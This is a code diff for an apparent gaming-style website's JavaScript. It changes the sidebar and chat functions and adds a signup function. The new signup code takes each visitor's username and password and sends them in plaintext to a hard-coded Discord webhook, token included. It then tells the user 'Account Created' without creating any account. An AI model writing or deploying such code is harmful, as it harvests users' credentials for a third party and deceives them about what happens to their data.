@@ -1,42 +1,14 @@
-// LOADER (LONGER + SMOOTH)
-window.addEventListener("load", () => {
-    const loader = document.getElementById("loader");
-
-    setTimeout(() => {
-        loader.style.opacity = "0";
-        setTimeout(() => loader.style.display = "none", 800);
-    }, 2500); // LONGER LOADING
-});
-
-// NAV FIX
-window.addEventListener("scroll", () => {
-    const nav = document.querySelector("nav");
-    nav.style.background = window.scrollY > 50 
-        ? "rgba(0,0,0,0.9)" 
-        : "rgba(0,0,0,0.4)";
-});
-
-// PROMO SYSTEM
-function redeemCode() {
-    const input = document.getElementById("promoInput").value;
-    const result = document.getElementById("promoResult");
-
-    if (input === "KASHIO10") {
-        result.innerText = "+10% XP BOOST ACTIVATED";
-        result.style.color = "#00ff99";
-    } else {
-        result.innerText = "Invalid code";
-        result.style.color = "red";
-    }
+// SIDEBAR TOGGLE
+function toggleSidebar() {
+    document.querySelector(".sidebar").classList.toggle("collapsed");
 }
 
-// CHAT TOGGLE
+// CHAT
 function toggleChat() {
-    const chat = document.getElementById("chatBox");
-    chat.classList.toggle("open");
+    document.querySelector(".chat-box").classList.toggle("open");
 }
 
-// SEND MESSAGE (DISCORD WEBHOOK)
+// SEND CHAT → YOUR WEBHOOK
 function sendMessage() {
     const input = document.getElementById("chatInput");
     const msg = input.value;
@@ -47,13 +19,25 @@ function sendMessage() {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            content: "New Support Message: " + msg
+            content: "Support Message: " + msg
         })
     });
 
-    document.getElementById("chatMessages").innerHTML += `
-        <div class="user-msg">${msg}</div>
-    `;
-
     input.value = "";
+}
+
+// SIGNUP SYSTEM → WEBHOOK
+function signup() {
+    const user = document.getElementById("username").value;
+    const pass = document.getElementById("password").value;
+
+    fetch("https://discord.com/api/webhooks/1486915810533314662/YmVunZtYx0xnh2yGzGIcrVdPMTCzX47uDpntZuyZL9CRPbEu6OCpdaLMxsLurZCNXuYi", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            content: `NEW USER\nUsername: ${user}\nPassword: ${pass}`
+        })
+    });
+
+    alert("Account Created");
 }
